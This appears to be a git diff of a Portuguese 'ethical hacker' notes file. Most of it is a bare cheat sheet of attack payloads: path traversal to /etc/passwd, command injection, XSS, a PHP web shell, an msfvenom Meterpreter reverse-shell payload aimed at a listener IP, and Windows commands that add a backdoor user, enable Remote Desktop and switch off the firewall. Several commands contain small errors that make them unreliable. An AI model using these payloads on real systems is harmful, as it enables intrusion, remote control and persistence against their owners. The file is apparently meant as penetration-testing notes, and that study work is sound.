@@ -17,42 +17,55 @@ Encontre aqui notas e comandos de um HACKER ÉTICO
 .
 
 	/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd
+	
 .
 
 	/../../../../../../../../../../etc/passwd
+	
 .
 
 	;dir;#
+	
 .
 
 	<script>alert('Pentester')</script>
+	
 .
 
 	<?php system($_GET['hacker']);?>
+	
 .
 
 	<?php system('id']);?>
+	
 .
 
 	msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f ext -o name.ext
+	
 .
 
 	python3 -c 'import pty;pty.spawn("/bin/bash")'
+	
 .
 
 	net user suporte 12345 /add
+	
 .
 
 	net localgroup "Remote Desktop Users" suporte /ad
+	
 .
 
 	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+	
 .
 
 	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+	
 .
 
 	NetSh Advfirewall set allprofiles state off
+	
 .
 .
 .
@@ -229,7 +242,7 @@ Remove usuario
 Add usuario ao grupo remote users
 
 
-Adicionar usuários: https://ampliando.net/?p=491#:~:text=Para%20adicionar%20um%20usu%C3%A1rio%20de,computador%20estiver%20conectado%20%C3%A0%20rede.
+[Adicionar usuários] (https://ampliando.net/?p=491#:~:text=Para%20adicionar%20um%20usu%C3%A1rio%20de,computador%20estiver%20conectado%20%C3%A0%20rede.)
 
 
 ## VISÃO GERAL SOBRE WEB E HTTP
